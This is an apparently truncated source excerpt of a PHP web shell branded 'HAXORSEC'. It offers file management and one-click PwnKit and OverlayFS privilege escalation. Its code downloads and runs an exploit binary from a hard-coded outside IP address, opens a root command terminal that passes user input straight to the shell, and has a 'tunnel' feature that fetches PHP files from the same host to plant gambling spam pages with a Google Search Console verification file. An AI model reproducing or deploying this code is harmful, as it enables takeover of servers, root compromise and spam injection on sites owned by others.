...
<body>
    ...
    <div class="menu-tools">
        <ul>
            ...
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=pwnkit" class="btn-submit badge-root"><i class="fa-solid fa-user-lock"></i> PWNKIT</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=overlayfs" class="btn-submit badge-root"><i class="fa-solid fa-user-lock"></i> OVERLAYFS</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="btn-submit"><i class="fa-solid fa-database"></i> Adminer</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&jumping" class="btn-submit"><i class="fa-brands fa-linux"></i> Lompat Indah</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&tunnel" class="btn-submit"><i class="fa-brands fa-linux"></i> Tunnel</a></li>
    ...
    <div class="menu-file-manager">
        <ul> 
            ...
            <div class="modal-body-cr">
                <li class="fa-solid fa-folder-plus"> Create Folder <input type="text" name="create_folder" class="modal-create-input-cr" placeholder="Create Folder"></br><div class="fa-folder-plus"> Create File <input type="text" name="create_file" class="modal-create-input-cr" placeholder="Create File"></div>
                <div class="modal-btn-form-cr">
                <input type="submit" name="submit" value="Submit" class="btn-modal-closes box-shadow">
           </div>
    </form>
        </ul>
        <div class="path-pwd">
            ...
            <div class="modal-container">
                ...
                <form action="" method="post">
                    <div class="modal-body">
                        <div class="modal-isi">
                            <form action="" method="post">
                            <input type="text" name="pathsite" class="modal-create-input" placeholder="PATH SITE EXAMPLE : https://google.com/slot-gacor/">
                            <br><br>
                                <input type="text" name="pathtunnel" class="modal-create-input" placeholder="PATH DIRECTORY EXAMPLE : /home/user/public_html/slot-gacor">
                                <br><br>
                                <input type="text" name="nameconsole" class="modal-create-input" placeholder="NAME GOOGLE SEARCH CONSOLE HTML">
                                <br><br>
                        </div>
                        <div class="modal-btn-form">
                            <input type="submit" name="submittunnel" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                </form>
            </div>
        </div>
    ...
    <?php if ($_GET['terminal'] == "overlayfs") : ?>
        <div class="terminal">
            <div class="terminal-container">
                <div class="terminal-head">
                    <ul>
                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;OVERLAYFS EXPLOIT - HAXORSEC</b></li>
                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
                    </ul>
                </div>
        ...
        <div class="terminal-body">
                    <textarea name="" disabled>
                        <?php 
                        if ($fungsi[3]('.haxor-root') && $fungsi[3]('overlayfs')) {
                            $response = $fungsi[11]('.haxor-root');
                            $r_text = explode(" ",$response);                                            
                            if ($r_text[0] == "uid=0(root)") {
                                if (isset($_POST['submits-root'])) {
                                    echo cmd('echo  '.$_POST['roots-terminal']  .' | ./overlayfs 2>&1');
                                }else{
                                    echo "[+] GOTCHAAAAA!!!\n";
                                    echo cmd("echo id | ./overlayfs");
                                }
                            } else {
                    ...
                    <form action="" method="post">
                        <ul>
                            <li><input type="text" name="roots-terminal" class="terminal-input" placeholder="<?= "root" . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
                            <li><input type="submit" name="submits-root" value=">" class="btn-modal-close"></li>
                        </ul>
                    </form>
                </div>
            </div>
...
if (isset($_POST['submittunnel'])) {
    $pathtunnel = $_POST['pathtunnel'];
    $nameconsole = $_POST['nameconsole'];
    $pathsite = $_POST['pathsite'];
    echo cmd('mkdir '.$pathtunnel);
    echo cmd('wget -q http://66.29.154.240/tun/index.txt -O '.$pathtunnel.'/index.php');
    echo cmd('wget -q http://66.29.154.240/tun/program.txt -O '.$pathtunnel.'/program.php');
    echo cmd('wget -q http://66.29.154.240/tun/list.txt -O '.$pathtunnel.'/list.txt');
    echo cmd('echo google-site-verification: '.$nameconsole.' > '.$pathtunnel.'/'.$nameconsole);
    echo cmd('curl -sL '.$pathsite.'/program.php');
...
if ($_GET['terminal'] == "pwnkit") {
    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
        ...
        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&terminal=pwnkit">';
    }
}

if ($_GET['terminal'] == "overlayfs") {
    if (!$fungsi[3]('overlayfs') && $fungsi[4]($fungsi[0]())) {
        $fungsi[28]("overlayfs", $fungsi[11]("http://66.29.154.240/overlayfs"));
        cmd('chmod +x overlayfs');
 #      echo cmd('id');
        echo cmd('echo id | ./overlayfs > .haxor-root');
        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&terminal=overlayfs">';
    }
}
